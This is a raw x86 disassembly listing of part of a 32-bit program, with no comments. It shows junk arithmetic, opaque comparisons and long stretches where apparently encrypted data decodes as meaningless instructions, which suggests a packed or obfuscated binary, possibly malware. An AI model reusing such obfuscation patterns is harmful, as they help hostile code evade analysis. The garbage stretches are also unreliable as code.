  4095e6:	sub    DWORD PTR ds:0x4283c5,ecx
  4095ec:	mov    DWORD PTR [ebp-0x1c],0xfc1
  4095f3:	mov    edx,DWORD PTR ds:0x428399
  4095f9:	mov    edx,DWORD PTR [edx]
  4095fb:	adc    DWORD PTR ds:0x42830d,edx
  409601:	mov    DWORD PTR [ebp-0x28],0x7044
  409608:	or     DWORD PTR ds:0x4283dd,0x3ffc
  409612:	mov    DWORD PTR [ebp-0x24],0x7bf
  409619:	mov    eax,DWORD PTR [ebp-0x28]
  40961c:	adc    ecx,0x6b26
  409622:	mov    ecx,DWORD PTR [ebp-0x24]
  409625:	add    DWORD PTR ds:0x428521,edi
  40962b:	mov    edx,DWORD PTR [ebp-0x20]
  40962e:	cmp    DWORD PTR ds:0x4283e5,0x0
  409635:	mov    DWORD PTR ds:0x4283ed,edi
  40963b:	mov    DWORD PTR ds:0x4283b5,ecx
  409641:	mov    DWORD PTR ds:0x4283f5,0x2db2
  40964b:	jmp    0x409715
  409650:	mov    esi,DWORD PTR ds:0x4283f1
  409656:	mov    DWORD PTR ds:0x428489,ebx
  40965c:	cmp    DWORD PTR ds:0x4283e5,0x0
  409663:	jg     0x409686
  409669:	push   0x3d0d
  40966e:	call   DWORD PTR ds:0x42e000
  409674:	xor    DWORD PTR ds:0x4283e9,ecx
  40967a:	sbb    DWORD PTR ds:0x4283e5,edi
  409680:	dec    DWORD PTR ds:0x4282f9
  409686:	mov    esi,DWORD PTR ds:0x4282e5
  40968c:	xor    DWORD PTR ds:0x42848d,esi
  409692:	and    DWORD PTR ds:0x428495,ecx
  409698:	dec    esi
  409699:	cmp    DWORD PTR ds:0x428499,0x0
  4096a0:	mov    DWORD PTR ds:0x4284a1,0x1a91
  4096aa:	movzx  esi,BYTE PTR ds:0x4282f1
  4096b1:	mov    esi,0x63fe
  4096b6:	jmp    0x409715
  4096bb:	mov    DWORD PTR ds:0x4283dd,0x20e7
  4096c5:	cmp    DWORD PTR ds:0x428499,0x0
  4096cc:	jae    0x4096f5
  4096d2:	push   DWORD PTR [ebp-0x20]
  4096d5:	push   0x278f
  4096da:	push   DWORD PTR [ebp-0x1c]
  4096dd:	call   DWORD PTR ds:0x42e004
  4096e3:	or     esi,DWORD PTR ds:0x428481
  4096e9:	sbb    esi,DWORD PTR ds:0x428475
  4096ef:	and    DWORD PTR ds:0x4282dd,edx
  4096f5:	dec    DWORD PTR ds:0x428519
  4096fb:	or     esi,0x67c0
  409701:	add    DWORD PTR ds:0x4283c5,0x146d
  40970b:	sbb    DWORD PTR ds:0x428515,0xdcf
  409715:	mov    esi,DWORD PTR [ebp-0x1c]
  409718:	add    eax,0x355c
  40971d:	mov    DWORD PTR ds:0x42831d,0x28d
  409727:	adc    ecx,0x819
  40972d:	xor    DWORD PTR ds:0x4282e1,0x49ee
  409737:	or     eax,edx
  409739:	mov    DWORD PTR ds:0x428315,0x383a
  409743:	mov    edx,DWORD PTR [ebp-0x10]
  409746:	or     ecx,esi
  409748:	sub    DWORD PTR ds:0x428309,0x6778
  409752:	mov    esi,DWORD PTR [ebp-0xc]
  409755:	or     eax,edx
  409757:	movzx  edx,BYTE PTR ds:0x4284fd
  40975e:	xor    edx,DWORD PTR ds:0x428415
  409764:	mov    DWORD PTR ds:0x4284fd,edx
  40976a:	mov    edx,DWORD PTR [ebp-0x30]
  40976d:	or     ecx,esi
  40976f:	mov    esi,DWORD PTR [ebp-0x2c]
  409772:	or     eax,0xf34
  409777:	neg    DWORD PTR ds:0x428419
  40977d:	or     ecx,0x6c90
  409783:	mov    DWORD PTR ds:0x42840d,0x7584
  40978d:	cmp    edx,eax
  40978f:	mov    DWORD PTR ds:0x4283f1,0x7ecb
  409799:	jne    0x4097bb
  40979f:	mov    DWORD PTR ds:0x4283bd,0x4655
  4097a9:	cmp    esi,ecx
  4097ab:	mov    DWORD PTR ds:0x4283bd,0x7ff3
  4097b5:	je     0x40a10f
  4097bb:	xor    esi,esi
  4097bd:	or     esi,DWORD PTR ds:0x42850d
  4097c3:	adc    DWORD PTR ds:0x428495,esi
  4097c9:	mov    DWORD PTR [ebp-0x30],0x5ddc
  4097d0:	mov    DWORD PTR [ebp-0x2c],0x7433
  4097d7:	mov    eax,DWORD PTR [ebp-0x30]
  4097da:	mov    ecx,DWORD PTR [ebp-0x2c]
  4097dd:	xor    ecx,0xfffffd1f
  4097e3:	xor    eax,0xffff9fff
  4097e8:	and    ecx,0x6e0
  4097ee:	and    eax,0x6244
  4097f3:	mov    DWORD PTR [ebp-0x10],eax
  4097f6:	mov    DWORD PTR [ebp-0xc],ecx
  4097f9:	mov    DWORD PTR [ebp-0x20],0x4a50
  409800:	mov    DWORD PTR [ebp-0x1c],0x2079
  409807:	mov    DWORD PTR [ebp-0x28],0x792e
  40980e:	mov    DWORD PTR [ebp-0x24],0x10e8
  409815:	mov    DWORD PTR [ebp-0x30],0x22b3
  40981c:	mov    DWORD PTR [ebp-0x2c],0x2293
  409823:	mov    eax,DWORD PTR [ebp-0x30]
  409826:	mov    ecx,DWORD PTR [ebp-0x2c]
  409829:	mov    edx,DWORD PTR [ebp-0x28]
  40982c:	mov    esi,DWORD PTR [ebp-0x24]
  40982f:	add    eax,edx
  409831:	mov    edx,DWORD PTR [ebp-0x20]
  409834:	adc    ecx,esi
  409836:	mov    esi,DWORD PTR [ebp-0x1c]
  409839:	add    eax,0x3e60
  40983e:	adc    ecx,0xd49e
  409844:	xor    eax,0x14ce
  409849:	xor    ecx,0x354f
  40984f:	add    eax,edx
  409851:	mov    edx,DWORD PTR [ebp-0x10]
  409854:	adc    ecx,esi
  409856:	mov    esi,DWORD PTR [ebp-0xc]
  409859:	cmp    edx,eax
  40985b:	jne    0x409869
  409861:	cmp    esi,ecx
  409863:	je     0x40a10f
  409869:	mov    DWORD PTR [ebp-0x28],0x4db
  409870:	mov    DWORD PTR [ebp-0x24],0x233b
  409877:	mov    DWORD PTR [ebp-0x30],0x2c94
  40987e:	push   0x6b33
  409883:	mov    DWORD PTR [ebp-0x2c],0x647f
  40988a:	jmp    0x409b09
  40988f:	and    BYTE PTR [ebx-0x53bd1443],ah
  409895:	sub    al,0xab
  409897:	dec    edi
  409898:	test   al,0xc
  40989a:	xchg   edx,eax
  40989b:	and    dh,dh
  40989d:	adc    al,0x9e
  40989f:	xacquire xchg DWORD PTR [esi-0x413d8642],edi
  4098a6:	mov    esi,0x8b0e9887
  4098ab:	ror    DWORD PTR [edx+0x6f18bb6c],1
  4098b1:	mov    bh,0xb7
  4098b3:	fild   QWORD PTR [edi+ecx*2+0x527cde60]
  4098ba:	icebp  
  4098bb:	sbb    eax,0x310cf67f
  4098c0:	sub    al,0xda
  4098c2:	xchg   BYTE PTR [eax-0x6c],bh
  4098c5:	xchg   DWORD PTR [eax-0x49],eax
  4098c8:	in     eax,0x62
  4098ca:	(bad)  [esi]
  4098cc:	pop    ds
  4098cd:	stc    
  4098ce:	out    dx,eax
  4098cf:	pop    ebp
  4098d0:	xchg   esp,eax
  4098d1:	test   al,0xd2
  4098d3:	pop    ebx
  4098d4:	daa    
  4098d5:	xor    DWORD PTR [edx+0x41],ecx
  4098d8:	push   edi
  4098d9:	cs jle 0x40986a
  4098dc:	outs   dx,DWORD PTR ds:[esi]
  4098dd:	ins    DWORD PTR es:[edi],dx
  4098de:	cmp    eax,0xc297303e
  4098e3:	push   es
  4098e4:	and    eax,0x4c1a9dae
  4098e9:	or     DWORD PTR [edi],0xffffffc6
  4098ec:	rol    DWORD PTR [esi+edi*8-0x12],1
  4098f0:	add    eax,0x3a968c87
  4098f5:	mov    al,ds:0x775584ee
  4098fa:	mov    al,0x8c
  4098fc:	sub    DWORD PTR [edx+0x3fe71bb6],0xa5bf1060
  409906:	outs   dx,BYTE PTR ds:[esi]
  409907:	and    al,BYTE PTR [ebp+0x47]
  40990a:	add    al,0x5f
  40990c:	lods   al,BYTE PTR ds:[esi]
  40990d:	aaa    
  40990e:	fcomp  DWORD PTR [edi-0x8]
  409911:	or     eax,0xdb20c710
  409916:	int3   
  409917:	mov    bh,0xc2
  409919:	inc    ecx
  40991a:	push   cs
  40991b:	loop   0x4098d4
  40991d:	and    BYTE PTR [ebp+0x7a2e35b1],bl
  409923:	call   0xa3b:0xef315b5
  40992a:	ss stos DWORD PTR es:[edi],eax
  40992c:	in     eax,dx
  40992d:	jl     0x4098fa
  40992f:	xchg   esi,eax
  409930:	xchg   ecx,eax
  409931:	push   cs
  409932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409933:	jnp    0x409960
  409935:	mov    eax,0x91bfd87
  40993a:	aaa    
  40993b:	loop   0x4098c3
  40993d:	out    0xf8,eax
  40993f:	jmp    0x409954
  409941:	sub    BYTE PTR [esp+ecx*2+0x3524318b],ah
  409948:	adc    eax,0x8dfcb73f
  40994d:	ins    DWORD PTR es:[edi],dx
  40994e:	add    eax,0xfb525f5a
  409953:	sub    eax,0xe5edece7
  409958:	pushf  
  409959:	aad    0x90
  40995b:	add    DWORD PTR [esi+0x5f],edx
  40995e:	gs in  eax,dx
  409960:	stos   DWORD PTR es:[edi],eax
  409961:	pop    esi
  409962:	cmp    al,0x88
  409965:	test   eax,0x3ecc5325
  40996a:	xor    al,0x13
  40996c:	and    eax,0xac6adaf1
  409971:	xor    DWORD PTR [edi+0x12],edi
  409974:	xor    al,0x1a
  409976:	mov    edx,esp
  409978:	jmp    0xfdcec854
  40997d:	(bad)  
  40997e:	bnd jnp 0x4099ab
  409981:	xchg   esp,eax
  409982:	in     al,dx
  409983:	push   es
  409984:	das    
  409985:	imul   ecx,DWORD PTR [edx+ecx*2+0x78],0x73
  40998a:	xchg   esi,eax
  40998b:	shl    ebx,cl
  40998d:	inc    edx
  40998e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40998f:	call   FWORD PTR [edx+ecx*4]
  409992:	add    DWORD PTR [edx],esi
  409994:	popf   
  409995:	mov    bh,0x4e
  409997:	(bad)  
  409998:	mov    ch,0x47
  40999a:	lock jge 0x409994
  40999d:	out    0xd4,al
  40999f:	cs jge 0x40998c
  4099a2:	push   0x1aeda2ae
  4099a7:	and    dh,BYTE PTR [esi+0x4b]
  4099aa:	xchg   esi,eax
  4099ab:	pushf  
  4099ac:	imul   edx,DWORD PTR [ecx-0x80],0x46
  4099b0:	nop
  4099b1:	imul   edi,DWORD PTR [eax],0x8534f03a
  4099b7:	adc    DWORD PTR [ebp-0x3410a150],0x64
  4099be:	mov    al,ds:0xac57bb34
  4099c3:	loopne 0x4099a2
  4099c5:	xor    BYTE PTR [edx-0x2593aa60],0x4
  4099cc:	sub    al,0xe2
  4099ce:	js     0x409a30
  4099d0:	sahf   
  4099d1:	imul   ebx,DWORD PTR [ebx-0x234cb6e8],0x51
  4099d8:	xchg   ebp,eax
  4099d9:	jle    0x409970
  4099db:	emms   
  4099dd:	lahf   
  4099de:	out    dx,eax
  4099df:	xchg   BYTE PTR [ebx-0x3f],cl
  4099e2:	vmread esp,edi
  4099e5:	add    edx,DWORD PTR [edi+0x3d]
  4099e8:	push   ds
  4099e9:	push   eax
  4099ea:	mov    dl,0x44
  4099ec:	(bad)  
  4099ee:	in     al,0x4d
  4099f0:	jb     0x4099c1
  4099f2:	or     ch,BYTE PTR [ecx]
  4099f4:	inc    edi
  4099f5:	push   0x71c5c8cc
  4099fa:	and    DWORD PTR [ebx],0x31b1c94c
  409a00:	inc    ecx
  409a01:	nop
  409a02:	adc    al,0xff
  409a04:	pop    ecx
  409a05:	dec    esp
  409a06:	leave  
  409a07:	cwde   
  409a08:	repz inc ecx
  409a0a:	pop    ds
  409a0b:	out    dx,al
  409a0c:	lahf   
  409a0d:	bound  esp,QWORD PTR [esi-0x4e]
  409a10:	adc    ecx,esi
  409a12:	adc    DWORD PTR [ecx],ebx
  409a14:	and    ebp,DWORD PTR [edx]
  409a16:	fadd   st(5),st
  409a18:	inc    edi
  409a19:	xchg   ecx,eax
  409a1a:	imul   esp,DWORD PTR [eax],0x78
  409a1d:	(bad)  
  409a1e:	ds ja  0x409a27
  409a21:	int    0x3
  409a23:	cld    
  409a24:	ds pushf 
  409a26:	jmp    0x409a23
  409a28:	sub    ah,BYTE PTR [ebx-0x4a]
  409a2b:	les    eax,FWORD PTR [ecx-0x69f67bb5]
  409a31:	pop    esi
  409a32:	jmp    0x492a9f8
  409a37:	sar    BYTE PTR [eax-0xa],0x3c
  409a3b:	push   0xffffffc3
  409a3d:	test   eax,0xab5a8cb3
  409a42:	loope  0x4099fb
  409a44:	enter  0xed5c,0x89
  409a48:	sahf   
  409a49:	xchg   ecx,eax
  409a4a:	imul   DWORD PTR [ebx+0x2e]
  409a4d:	jnp    0x409a02
  409a4f:	sbb    bl,cl
  409a51:	push   ebp
  409a52:	fs add eax,0x74fd5448
  409a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a59:	data16 jno 0x4099f3
  409a5c:	or     DWORD PTR [edx+0x67a6e9d7],0x6caf5150
  409a66:	das    
  409a67:	add    bh,al
  409a69:	pushf  
  409a6a:	clc    
  409a6b:	or     BYTE PTR [edx-0x71e31483],0x42
  409a72:	jns    0x409aa0
  409a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a75:	fxam   
  409a77:	push   es
  409a78:	xor    DWORD PTR [ebx+0x3e],eax
  409a7b:	fcom   DWORD PTR [edx+edi*4-0x78e34319]
  409a82:	ss jg  0x409a2f
  409a85:	dec    esi
  409a86:	dec    ebp
  409a87:	xchg   BYTE PTR [esi+0x6ca06c86],al
  409a8d:	(bad)  
  409a8f:	and    bl,bl
  409a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a92:	push   ebx
  409a93:	dec    ebp
  409a94:	dec    cl
  409a96:	add    al,0xcd
  409a98:	stos   BYTE PTR es:[edi],al
  409a99:	stc    
  409a9a:	adc    eax,0x9b2664b6
  409a9f:	pop    eax
  409aa0:	popf   
  409aa1:	les    esp,FWORD PTR [edi+0x69]
  409aa4:	dec    ebx
  409aa5:	mov    ds:0x8117deb8,eax
  409aaa:	and    DWORD PTR [edx+eiz*2+0x3fc75c16],eax
  409ab1:	out    dx,eax
  409ab2:	mov    esi,0xe47c6688
  409ab7:	dec    esi
  409ab8:	push   cs
  409ab9:	and    DWORD PTR [eax-0x38d3ac0d],0x507a9bae
  409ac3:	imul   DWORD PTR [eax-0x7d]
  409ac6:	lahf   
  409ac7:	xlat   BYTE PTR ds:[ebx]
  409ac8:	xchg   ebx,eax
  409ac9:	mov    gs,WORD PTR [edi*8+0x5bd85966]
  409ad0:	lds    esi,FWORD PTR [edi+0x7f]
  409ad3:	neg    bh
  409ad5:	xor    eax,0xad77e867
  409ada:	adc    DWORD PTR [edi],eax
  409adc:	mov    al,ds:0x3483224f
  409ae1:	clc    
  409ae2:	adc    eax,0x77f6e116
  409ae7:	dec    edx
  409ae8:	push   cs
  409ae9:	adc    dh,dl
  409aeb:	sub    al,0xa
  409aed:	jp     0x409b65
  409aef:	adc    eax,0x25b79fa7
  409af4:	arpl   WORD PTR [edi],si
  409af6:	sub    DWORD PTR [edx+0x34],ebx
  409af9:	bswap  edx
  409afb:	add    bl,BYTE PTR [esi+eax*4+0x13cee7af]
  409b02:	call   0x64ba227d
  409b07:	nop
  409b08:	cmp    al,0x8b
  409b0a:	inc    ebp
  409b0b:	ror    BYTE PTR [ebx-0x70972bb3],1
  409b11:	jl     0x409b13
  409b13:	add    BYTE PTR [ecx+0x50],dl
  409b16:	call   0x41594e
  409b1b:	mov    ecx,DWORD PTR [ebp-0x28]
  409b1e:	mov    esi,DWORD PTR [ebp-0x24]
  409b21:	push   0x4e1a18a
  409b26:	push   0x283cdcc
  409b2b:	and    edx,esi
  409b2d:	and    eax,ecx
  409b2f:	push   edx
  409b30:	push   eax
  409b31:	call   0x41594e
  409b36:	xor    eax,0x687b
  409b3b:	xor    edx,0x18d4
  409b41:	mov    DWORD PTR [ebp-0x30],eax
  409b44:	mov    DWORD PTR [ebp-0x2c],edx
  409b47:	mov    eax,ds:0x4228cc
  409b4c:	cmp    eax,0x7cd80819
  409b51:	jne    0x40a10f
  409b57:	mov    eax,DWORD PTR [ebp-0x18]
  409b5a:	mov    ecx,DWORD PTR [ebp-0x14]
  409b5d:	mov    edx,DWORD PTR [ebp-0x18]
  409b60:	mov    esi,DWORD PTR [ebp-0x14]
  409b63:	shrd   eax,ecx,0x2
  409b67:	shl    edx,0x1e
  409b6a:	mov    edx,DWORD PTR ds:0x4226b8
  409b70:	mov    edx,DWORD PTR [edx+0x1a8]
  409b76:	shr    ecx,0x2
  409b79:	xor    esi,esi
  409b7b:	mov    ecx,0x32de6d5d
  409b80:	xor    eax,ecx
  409b82:	or     eax,esi
  409b84:	mov    DWORD PTR [edx],eax
  409b86:	mov    eax,DWORD PTR [ebp-0x18]
  409b89:	mov    edx,DWORD PTR [ebp-0x14]
  409b8c:	shrd   eax,edx,0x2
  409b90:	shr    edx,0x2
  409b93:	mov    edx,DWORD PTR [ebp-0x18]
  409b96:	mov    esi,DWORD PTR [ebp-0x14]
  409b99:	xor    eax,ecx
  409b9b:	xor    esi,esi
  409b9d:	or     eax,esi
  409b9f:	mov    ds:0x4228cc,eax
  409ba4:	mov    BYTE PTR [ebp-0x2],0x4f
  409ba8:	mov    BYTE PTR [ebp-0x1],0xf9
  409bac:	movzx  eax,BYTE PTR [ebp-0x1]
  409bb0:	shl    edx,0x1e
  409bb3:	mov    dl,BYTE PTR [ebp-0x2]
  409bb6:	xor    al,0x42
  409bb8:	add    al,dl
  409bba:	jmp    0x409e39
  409bbf:	mov    ah,0x7e
  409bc1:	mov    ch,0xd4
  409bc3:	mov    ebx,0x3e9ebcfc
  409bc8:	mov    cl,0x9a
  409bca:	jecxz  0x409c11
  409bcc:	xchg   BYTE PTR [esi-0x4174515c],al
  409bd2:	mov    esi,0xbebec279
  409bd7:	cmp    dl,bl
  409bd9:	out    0x91,eax
  409bdb:	int3   
  409bdc:	bound  ebp,QWORD PTR [eax+0x1f]
  409bdf:	xchg   esi,eax
  409be0:	inc    esi
  409be1:	adc    ebp,DWORD PTR [ebp+0x43943e6]
  409be7:	ret    
  409be8:	xchg   esi,eax
  409be9:	adc    al,0x38
  409beb:	xchg   esi,eax
  409bec:	mov    esp,0xe67e315a
  409bf1:	add    DWORD PTR [ebx-0x32],eax
  409bf4:	xchg   edi,eax
  409bf5:	add    al,0x4d
  409bf7:	ins    DWORD PTR es:[edi],dx
  409bf8:	push   cs
  409bf9:	aas    
  409bfa:	out    dx,eax
  409bfb:	sub    dl,al
  409bfd:	and    esi,ecx
  409bff:	ins    DWORD PTR es:[edi],dx
  409c00:	call   0x5f3b1b86
  409c05:	pop    eax
  409c06:	adc    BYTE PTR [edx],0x8c
  409c09:	mov    ebp,0xfe9c97ae
  409c0e:	mov    cl,0x1
  409c10:	in     eax,dx
  409c11:	in     al,0xff
  409c13:	or     DWORD PTR [edi],esi
  409c15:	cmc    
  409c16:	mov    ebp,0x9eab5cc7
  409c1b:	ror    DWORD PTR [eax-0x4c],1
  409c1e:	dec    edi
  409c1f:	mov    BYTE PTR [eax+0x6c272404],bh
  409c25:	stos   BYTE PTR es:[edi],al
  409c26:	(bad)  
  409c27:	jp     0x409bb0
  409c29:	push   ebx
  409c2a:	and    ecx,DWORD PTR [esi]
  409c2c:	inc    BYTE PTR [edi+eax*8+0x17]
  409c30:	call   edx
  409c32:	(bad)  
  409c33:	leave  
  409c34:	mov    dh,0x2b
  409c36:	clc    
  409c37:	xor    BYTE PTR [ebx+0x7aa1e8af],bl
  409c3d:	outs   dx,DWORD PTR ds:[esi]
  409c3e:	mov    al,ds:0x9d9deded
  409c43:	push   0xffffffe5
  409c45:	lds    esp,FWORD PTR [esi]
  409c47:	xor    BYTE PTR [edx+ecx*2-0x2232cc84],bl
  409c4e:	sbb    ebx,DWORD PTR [ecx-0x66]
  409c51:	or     eax,0x7e7f6ca1
  409c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c57:	jle    0x409c01
  409c59:	out    dx,eax
  409c5a:	out    dx,al
  409c5b:	stos   DWORD PTR es:[edi],eax
  409c5c:	and    BYTE PTR [esi+eiz*4+0x554df301],0x79
  409c64:	lds    eax,FWORD PTR [esi+0x17]
  409c67:	inc    esp
  409c68:	dec    ecx
  409c69:	adc    ah,BYTE PTR [edx-0x38]
  409c6c:	mov    ecx,0x4aeeae3a
  409c71:	fdiv   DWORD PTR [edx+ebp*8]
  409c74:	xchg   ebp,eax
  409c75:	stc    
  409c76:	pop    ecx
  409c77:	push   edx
  409c78:	sbb    eax,0x263089dd
  409c7d:	or     DWORD PTR [esi-0xaa04e98],esi
  409c83:	mov    edx,0x9328fbe0
  409c88:	pop    edx
  409c89:	pushf  
  409c8a:	rcl    BYTE PTR [esi+ebp*1+0x26],0x57
  409c8f:	jge    0x409cad
  409c91:	mov    edi,0xd4392a27
  409c97:	scas   al,BYTE PTR es:[edi]
  409c98:	loopne 0x409c51
  409c9a:	fimul  WORD PTR [ebx+0x4b]
  409c9d:	ss sti 
  409c9f:	mov    ds:0xb6fbb7fa,al
  409ca4:	push   cs
  409ca5:	pop    eax
  409ca6:	push   eax
  409ca7:	jp     0x409cd6
  409ca9:	test   eax,0xa63d9b27
  409cae:	dec    esi
  409caf:	or     al,al
  409cb1:	adc    al,0x91
  409cb3:	mov    cl,0x9e
  409cb5:	mov    ah,BYTE PTR [eax]
  409cb7:	xchg   ecx,eax
  409cb8:	xor    BYTE PTR [edi+ebx*8-0x61],0xc7
  409cbd:	mov    al,ds:0xd86247a7
  409cc2:	push   esp
  409cc3:	loope  0x409d3f
  409cc5:	ror    BYTE PTR [ecx],1
  409cc7:	leave  
  409cc8:	mov    edi,0x4d9a1b5f
  409ccd:	sbb    esp,DWORD PTR [edi+0x32]
  409cd0:	cli    
  409cd1:	sbb    al,0xc3
  409cd3:	inc    eax
  409cd4:	mov    al,0x37
  409cd6:	adc    eax,0x95b89190
  409cdb:	xchg   ebx,eax
  409cdc:	and    al,BYTE PTR [bp+di-0xf]
  409ce0:	gs jno 0x409d40
  409ce3:	cmp    eax,0x69d99cbe
  409ce8:	sub    eax,0x3b1bcd55
  409ced:	ret    0x4092
  409cf0:	sbb    al,0x70
  409cf2:	adc    bl,BYTE PTR [edx+0x6f]
  409cf5:	sub    BYTE PTR [ebx-0x5a],bh
  409cf8:	push   es
  409cf9:	pop    ecx
  409cfa:	cs push edx
  409cfc:	iret   
  409cfd:	pusha  
  409cfe:	iret   
  409cff:	cmp    al,0xcd
  409d01:	push   0x3e39f362
  409d06:	fdivr  QWORD PTR [edx]
  409d08:	in     eax,0xc6
  409d0a:	inc    eax
  409d0b:	jmp    0x24ab79aa
  409d10:	jns    0x409d62
  409d12:	in     al,dx
  409d13:	jge    0x409d6a
  409d15:	repnz sbb DWORD PTR [eax],esi
  409d18:	and    eax,0x65e3f7ef
  409d1d:	mov    esi,0x6507b6fd
  409d22:	dec    ch
  409d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d25:	add    dh,BYTE PTR [eax]
  409d27:	add    al,0xc5
  409d29:	repnz pop ecx
  409d2b:	in     al,dx
  409d2c:	cmp    al,0x56
  409d2e:	cwde   
  409d2f:	leave  
  409d30:	push   ecx
  409d31:	rcl    bl,0xdb
  409d34:	push   edx
  409d35:	push   eax
  409d36:	mov    esp,0xd6f70d5f
  409d3b:	dec    esi
  409d3c:	fwait
  409d3d:	or     DWORD PTR ds:0x15a969ba,eax
  409d43:	not    DWORD PTR [ebp-0x62]
  409d46:	arpl   WORD PTR gs:[ecx],di
  409d49:	es adc al,0xc1
  409d4c:	push   ss
  409d4d:	aaa    
  409d4e:	js     0x409d25
  409d50:	shl    DWORD PTR [edx-0x6f2c4125],cl
  409d56:	out    dx,al
  409d57:	or     al,0xbd
  409d59:	push   es
  409d5a:	lock adc eax,0x49524b1b
  409d60:	(bad)  
  409d61:	mov    ebx,0x7c1e4ccf
  409d66:	ss cli 
  409d68:	aaa    
  409d69:	loope  0x409cfb
  409d6b:	fs or  al,0xfc
  409d6e:	mov    dl,0xbd
  409d70:	add    eax,0x273c386f
  409d75:	sti    
  409d76:	shr    BYTE PTR [eax+eax*1-0x3c05a648],0xdf
  409d7e:	jno    0x409db6
  409d80:	mov    al,ss:0xae617a30
  409d86:	push   esi
  409d87:	out    0x9a,eax
  409d89:	lods   eax,DWORD PTR ds:[esi]
  409d8a:	mov    edi,0x9b14d92b
  409d8f:	xchg   DWORD PTR [esi],edi
  409d91:	shr    BYTE PTR [ebx-0x5a],1
  409d94:	xchg   esi,eax
  409d95:	int    0x77
  409d97:	mov    al,0x5c
  409d99:	icebp  
  409d9a:	sbb    ebx,DWORD PTR [ebx-0x2a]
  409d9d:	arpl   si,dx
  409d9f:	xchg   DWORD PTR [ebx],edx
  409da1:	js     0xbc566744
  409da7:	retf   0x6ff1
  409daa:	xchg   edx,eax
  409dab:	popa   
  409dac:	mov    cl,BYTE PTR [edi]
  409dae:	jbe    0x409d85
  409db0:	xor    esp,DWORD PTR [edi]
  409db2:	adc    al,0xab
  409db4:	add    DWORD PTR [edi+0x14],0xaceceb25
  409dbb:	sbb    eax,0x32f03fa8
  409dc0:	push   eax
  409dc1:	mov    dh,0x3f
  409dc3:	out    0x33,eax
  409dc5:	dec    esi
  409dc6:	mov    bl,0xd2
  409dc8:	xor    BYTE PTR ds:0xe6787254,al
  409dce:	adc    edi,edi
  409dd0:	inc    esp
  409dd1:	rol    ebx,0x82
  409dd4:	ins    DWORD PTR es:[edi],dx
  409dd5:	xchg   ebp,eax
  409dd6:	pop    es
  409dd7:	loop   0x409e54
  409dd9:	sbb    al,0x5a
  409ddb:	pop    ebx
  409ddc:	sub    bl,bl
  409dde:	add    al,BYTE PTR es:[edx]
  409de1:	push   ecx
  409de2:	dec    edx
  409de3:	or     al,bl
  409de5:	add    eax,0x13de93dd
  409deb:	sub    ah,ch
  409ded:	push   0x48
  409def:	mov    ch,0xf2
  409df1:	adc    al,0xb1
  409df3:	cdq    
  409df4:	push   esi
  409df5:	seta   BYTE PTR [esi+0x1a]
  409df9:	xchg   ecx,eax
  409dfa:	jl     0x409e43
  409dfc:	leave  
  409dfd:	jmp    0x409e64
  409dff:	or     eax,0xe42847d7
  409e05:	in     eax,dx
  409e06:	mov    ecx,0x42cbd234
  409e0b:	ffreep st(7)
  409e0d:	xor    al,BYTE PTR gs:[ecx]
  409e10:	mov    WORD PTR [ebx-0x4],gs
  409e13:	push   edi
  409e14:	mov    dl,0x9e
  409e16:	pop    es
  409e17:	loop   0x409e8b
  409e19:	arpl   WORD PTR [ebx],bp
  409e1b:	mov    al,0xb5
  409e1d:	sbb    eax,0x8021e785
  409e22:	cmc    
  409e23:	jns    0x409e73
  409e25:	in     al,0xcc
  409e27:	arpl   si,si
  409e29:	dec    ecx
  409e2a:	out    0x9a,al
  409e2c:	(bad)  
  409e2d:	inc    BYTE PTR [eax]
  409e2f:	clc    
  409e30:	fisubr WORD PTR [ecx+eiz*2+0x5d88f539]
  409e37:	pop    ebx
  409e38:	sbb    ebp,DWORD PTR [edx+0x6]
  409e3b:	add    eax,0xfa
  409e40:	mov    BYTE PTR [ebp-0x4],al
  409e43:	mov    BYTE PTR [ebp-0x3],0x67
  409e47:	pop    eax
  409e48:	mov    BYTE PTR [ebp-0x1],al
  409e4b:	mov    BYTE PTR [ebp-0x2],0x3
  409e4f:	mov    dl,BYTE PTR [ebp-0x2]
  409e52:	movzx  esi,dl
  409e55:	cdq    
  409e56:	idiv   esi
  409e58:	mov    dl,BYTE PTR [ebp-0x1]
  409e5b:	add    al,dl
  409e5d:	mov    dl,BYTE PTR [ebp-0x3]
  409e60:	or     al,dl
  409e62:	mov    dl,BYTE PTR [ebp-0x4]
  409e65:	add    al,0x3a
  409e67:	cmp    dl,al
  409e69:	jae    0x40a10f
  409e6f:	mov    eax,DWORD PTR [ebp-0x18]
  409e72:	jmp    0x40a0f1
  409e77:	popa   
  409e78:	nop
  409e79:	popf   
  409e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7b:	mov    ah,0xb8
  409e7d:	imul   ebx,DWORD PTR [eax+edi*1+0x4a4862c],0x18
  409e85:	adc    al,0x9e
  409e87:	imul   edx,DWORD PTR [ecx-0x3d864142],0xfffbebe
  409e91:	push   cs
  409e92:	mov    ebx,eax
  409e94:	mov    al,ds:0x5a559af0
  409e99:	adc    al,BYTE PTR [ebp-0x38b108fb]
  409e9f:	cmp    BYTE PTR [esi+0x25736b3e],0x59
  409ea6:	(bad)  
  409ea7:	fldz   
  409ea9:	jmp    0xff3f:0x5c8d0dd3
  409eb0:	xchg   edx,eax
  409eb1:	dec    ebp
  409eb2:	fist   DWORD PTR [esi-0x28]
  409eb5:	mov    ds:0x6487237d,al
  409eba:	push   eax
  409ebb:	or     cl,BYTE PTR [esi+0x70cc4383]
  409ec1:	jae    0x409ea9
  409ec3:	mov    ebx,DWORD PTR [esp+eax*4-0x22]
  409ec7:	ins    BYTE PTR es:[edi],dx
  409ec8:	xor    cl,BYTE PTR [ecx]
  409eca:	leave  
  409ecb:	pop    edx
  409ecc:	adc    eax,0x569a11ff
  409ed1:	jo     0x409eea
  409ed3:	and    DWORD PTR [edx],ecx
  409ed5:	(bad)  
  409ed6:	sub    eax,0xbb1e0188
  409edb:	sub    al,0x69
  409edd:	mov    ebx,0x1385019c
  409ee2:	xchg   dh,cl
  409ee4:	jecxz  0x409f51
  409ee6:	stc    
  409ee7:	jge    0x409f0c
  409ee9:	mov    fs,WORD PTR [edx]
  409eeb:	add    DWORD PTR [eax-0x36e8c76b],0x2893e004
